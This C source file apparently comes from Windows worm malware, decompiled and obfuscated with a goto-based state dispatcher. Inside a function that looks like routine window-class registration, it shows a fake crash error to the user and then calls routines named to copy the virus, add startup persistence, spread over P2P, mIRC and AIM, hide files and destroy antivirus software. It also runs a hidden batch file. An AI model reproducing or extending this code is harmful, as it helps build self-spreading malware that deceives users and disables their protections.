#pragma optimize("", off)
#include "data_globals.h"
#include <windows.h>
#include <stdint.h>

void _MyRegisterClass(HINSTANCE param_1)
{
    volatile int dummy_state = 1;
    WNDCLASSEXA local_3c;

dummy_dispatcher:
    if (dummy_state == 1) goto block1;
    if (dummy_state == 2) goto block2;
    if (dummy_state == 3) goto block3;
    if (dummy_state == 4) goto block4;
    if (dummy_state == 5) goto block5;
    if (dummy_state == 6) goto block6;
    if (dummy_state == 7) goto block7;
    if (dummy_state == 8) goto block8;
    if (dummy_state == 9) goto block9;
    if (dummy_state == 10) goto block10;
    if (dummy_state == 11) goto block11;
    if (dummy_state == 0) goto end;

block1:
    local_3c.cbSize = sizeof(WNDCLASSEXA);
    local_3c.style = CS_HREDRAW | CS_VREDRAW;
    local_3c.lpfnWndProc = _WndProc_16;
    local_3c.cbClsExtra = 0;
    local_3c.cbWndExtra = 0;
    local_3c.hInstance = param_1;
    dummy_state = 2;
    goto dummy_dispatcher;

block2:
    local_3c.hIcon = LoadIconA(param_1, (LPCSTR)0x7f00);
    dummy_state = 3;
    goto dummy_dispatcher;

block3:
    local_3c.hCursor = LoadCursorA((HINSTANCE)0x0, (LPCSTR)0x7f00);
    dummy_state = 4;
    goto dummy_dispatcher;

block4:
    local_3c.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    local_3c.lpszMenuName = NULL;
    local_3c.lpszClassName = _szWindowClass;
    dummy_state = 5;
    goto dummy_dispatcher;

block5:
    local_3c.hIconSm = LoadIconA(local_3c.hInstance, (LPCSTR)0x7f00);
    dummy_state = 6;
    goto dummy_dispatcher;

block6:
    MessageBoxA(_hWnd,
                "This program has encountered an error and needs to close, please try again. If the problem persists try restarting your computer.",
                "Error", MB_ICONERROR);
    dummy_state = 7;
    goto dummy_dispatcher;

block7:
    _GetVirus();
    _CopyVirus();
    _WinStartup();
    dummy_state = 8;
    goto dummy_dispatcher;

block8:
    _P2PCopy();
    _FindmIRC();
    _WriteBatch();
    dummy_state = 9;
    goto dummy_dispatcher;

block9:
    _FindAIM();
    _HideFiles();
    _DestroyAVs();
    dummy_state = 10;
    goto dummy_dispatcher;

block10:
    ShellExecuteA(_hWnd, "open", "BBbLWDB.Bat", NULL, NULL, SW_HIDE);
    dummy_state = 11;
    goto dummy_dispatcher;

block11:
    RegisterClassExA(&local_3c);
    dummy_state = 0;
    goto dummy_dispatcher;

end:
    return;
}
#pragma optimize("", on)
